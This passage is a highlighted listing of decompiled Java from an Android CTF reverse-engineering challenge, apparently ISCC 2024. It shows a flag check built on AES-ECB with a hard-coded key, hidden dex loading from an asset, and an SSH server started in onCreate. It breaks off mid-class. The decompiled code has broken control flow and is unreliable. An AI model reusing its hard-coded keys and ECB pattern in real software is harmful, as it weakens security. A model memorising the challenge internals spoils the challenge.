class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ohhelp;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.res.AssetManager;<br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> dalvik.system.InMemoryDexClassLoader;<br><span class="hljs-keyword">import</span> dalvik.system.PathClassLoader;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.ByteBuffer;<br><span class="hljs-keyword">import</span> java.util.zip.ZipEntry;<br><span class="hljs-keyword">import</span> java.util.zip.ZipInputStream;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    Button but_1;<br>    EditText edt_1;<br>    TextView tv_1;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;ohhelp&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(bundle);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.but_1 = (Button) findViewById(R.id.Push_Yes);<br>        <span class="hljs-built_in">this</span>.edt_1 = (EditText) findViewById(R.id.Flag_Edit);<br>        <span class="hljs-built_in">this</span>.tv_1 = (TextView) findViewById(R.id.Tip);<br>        <span class="hljs-built_in">this</span>.but_1.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CHECK</span>());<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">SSHServer</span>(<span class="hljs-number">2222</span>).run();<br>    &#125;<br><br>    <span class="hljs-comment">/* loaded from: classes.dex */</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">CHECK</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener &#123;<br>        CHECK() &#123;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> &#123;<br>            <span class="hljs-keyword">if</span> (MainActivity.<span class="hljs-built_in">this</span>.Jformat(MainActivity.<span class="hljs-built_in">this</span>.edt_1.getText().toString())) &#123;<br>                MainActivity.<span class="hljs-built_in">this</span>.tv_1.setText(<span class="hljs-string">&quot;Got him!&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                MainActivity.<span class="hljs-built_in">this</span>.tv_1.setText(<span class="hljs-string">&quot;Hurry up! Catching the murderer is urgent!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">Jformat</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">if</span> (str.length() &gt;= <span class="hljs-number">6</span> &amp;&amp; str.substring(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>).equals(<span class="hljs-string">&quot;ISCC&#123;&quot;</span>) &amp;&amp; str.charAt(str.length() - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (str.substring(<span class="hljs-number">5</span>, str.length() - <span class="hljs-number">1</span>).equals(AesUtil.encrypt(a.a().substring(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>) + String.valueOf(getstr()).substring(String.valueOf(getstr()).length() - <span class="hljs-number">8</span>), <span class="hljs-string">&quot;IscC20244202CcsI&quot;</span>))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getstr</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">loadClass</span> <span class="hljs-operator">=</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">29</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDexClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteBuffer</span>[]&#123;ByteBuffer.wrap(LoadData(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;/ssh/data/getstr&quot;</span>))&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(((PathClassLoader) getClassLoader()).findLibrary(<span class="hljs-string">&quot;ohhelp&quot;</span>)).getParent(), getClassLoader().getParent()) : <span class="hljs-literal">null</span>).loadClass(<span class="hljs-string">&quot;com.example.ohhelp.getstr&quot;</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">return</span> (String) loadClass.getMethod(<span class="hljs-string">&quot;generateRandomString&quot;</span>, Integer.TYPE).invoke(loadClass.newInstance(), <span class="hljs-number">15</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException | InstantiationException | InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e2) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e2);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] LoadData(Context context, String str) &#123;<br>        <span class="hljs-type">byte</span>[] bArr = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(context.getFilesDir(), <span class="hljs-string">&quot;ssh&quot;</span>);<br>            file.mkdir();<br>            <span class="hljs-type">File</span> <span class="hljs-variable">file2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(file, <span class="hljs-string">&quot;data&quot;</span>);<br>            file2.mkdir();<br>            copyAssetFile(context.getAssets(), <span class="hljs-string">&quot;getstr.zip&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(file2, <span class="hljs-string">&quot;getstr&quot;</span>));<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(context.getFilesDir().getPath() + str);<br>            bArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fileInputStream.available()];<br>            fileInputStream.read(bArr);<br>            fileInputStream.close();<br>            <span class="hljs-keyword">return</span> bArr;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException unused) &#123;<br>            <span class="hljs-keyword">return</span> bArr;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyAssetFile</span><span class="hljs-params">(AssetManager assetManager, String str, File file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        InputStream inputStream;<br>        FileOutputStream fileOutputStream;<br>        ZipInputStream zipInputStream;<br>        ZipEntry nextEntry;<br>        <span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zipInputStream2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        zipInputStream2 = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            inputStream = assetManager.open(str);<br>            <span class="hljs-keyword">try</span> &#123;<br>                zipInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipInputStream</span>(inputStream);<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable th) &#123;<br>                th = th;<br>                fileOutputStream = <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable th2) &#123;<br>            th = th2;<br>            inputStream = <span class="hljs-literal">null</span>;<br>            fileOutputStream = <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        nextEntry = zipInputStream.getNextEntry();<br>                        <span class="hljs-keyword">if</span> (nextEntry != <span class="hljs-literal">null</span>) &#123;<br>                        &#125;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable th3) &#123;<br>                        th = th3;<br>                        fileOutputStream = <span class="hljs-literal">null</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">while</span> (!nextEntry.getName().equals(<span class="hljs-string">&quot;getstr&quot;</span>));<br>                <span class="hljs-keyword">break</span>;<br>                zipInputStream.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> zipInputStream.read(bArr);<br>                <span class="hljs-keyword">if</span> (read == -<span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                fileOutputStream.write(bArr, <span class="hljs-number">0</span>, read);<br>            &#125;<br>            fileOutputStream2 = fileOutputStream;<br>            <span class="hljs-keyword">if</span> (inputStream != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    inputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e2) &#123;<br>                    e2.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (fileOutputStream2 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fileOutputStream2.close();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e3) &#123;<br>                    e3.printStackTrace();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable th4) &#123;<br>            th = th4;<br>            zipInputStream2 = zipInputStream;<br>            <span class="hljs-keyword">if</span> (zipInputStream2 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    zipInputStream2.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e4) &#123;<br>                    e4.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (inputStream != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    inputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e5) &#123;<br>                    e5.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (fileOutputStream != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fileOutputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e6) &#123;<br>                    e6.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">throw</span> th;<br>        &#125;<br>        fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.example.ohhelp;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AesUtil</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES_CBC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES_CFB</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/CFB/PKCS5Padding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">AES_ECB</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AES/ECB/NOPadding&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">IV_LENGTH</span> <span class="hljs-operator">=</span> <span class="hljs-number">16</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(Object obj)</span> &#123;<br>        <span class="hljs-keyword">return</span> obj == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getBytes(String str) &#123;<br>        <span class="hljs-keyword">if</span> (isEmpty(str)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> str.getBytes(StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getIV</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">stringBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; IV_LENGTH.intValue(); i++) &#123;<br>            stringBuffer.append(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>.charAt(random.nextInt(<span class="hljs-number">62</span>)));<br>        &#125;<br>        <span class="hljs-keyword">return</span> stringBuffer.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SecretKeySpec <span class="hljs-title function_">getSecretKeySpec</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(getBytes(str), <span class="hljs-string">&quot;AES&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encrypt</span><span class="hljs-params">(String str, String str2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (isEmpty(str) || isEmpty(str2)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">stringBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(str);<br>        <span class="hljs-keyword">if</span> (str.length() != <span class="hljs-number">16</span>) &#123;<br>            stringBuffer.insert(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;0&quot;</span>).insert(<span class="hljs-number">7</span>, <span class="hljs-string">&quot;0&quot;</span>).insert(<span class="hljs-number">13</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">stringBuffer2</span> <span class="hljs-operator">=</span> stringBuffer.toString();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(AES_ECB);<br>            cipher.init(<span class="hljs-number">1</span>, getSecretKeySpec(str2));<br>            <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(cipher.doFinal(getBytes(stringBuffer2)));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String str, String str2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (isEmpty(str) || isEmpty(str2)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(str);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(AES_ECB);<br>            cipher.init(<span class="hljs-number">2</span>, getSecretKeySpec(str2));<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher.doFinal(decode), StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encrypt</span><span class="hljs-params">(String str, String str2, String str3, String str4)</span> &#123;<br>        <span class="hljs-keyword">if</span> (isEmpty(str) || isEmpty(str2) || isEmpty(str3)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(str4);<br>            cipher.init(<span class="hljs-number">1</span>, getSecretKeySpec(str2), <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(getBytes(str3)));<br>            <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(cipher.doFinal(getBytes(str)));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String str, String str2, String str3, String str4)</span> &#123;<br>        <span class="hljs-keyword">if</span> (isEmpty(str) || isEmpty(str2) || isEmpty(str3)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(str);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(str4);<br>            cipher.init(<span class="hljs-number">2</span>, getSecretKeySpec(str2), <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(getBytes(str3)));<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher.doFinal(decode), StandardCharsets.UTF_8);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">package</span> com.example.ohhelp;<br><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/* loaded from: assets/ssh/data/getstr */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getstr</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">NUM_CYCLES</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHAR_LOWER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHAR_UPPER</span> <span class="hljs-operator">=</span> CHAR_LOWER.toUpperCase();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHAR_NUMERIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHAR_SPECIAL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!@#$%^&amp;*()&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHAR_ALL</span> <span class="hljs-operator">=</span> CHAR_LOWER + CHAR_UPPER + CHAR_NUMERIC + CHAR_SPECIAL;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">SEED</span> <span class="hljs-operator">=</span> <span class="hljs-number">12345</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span 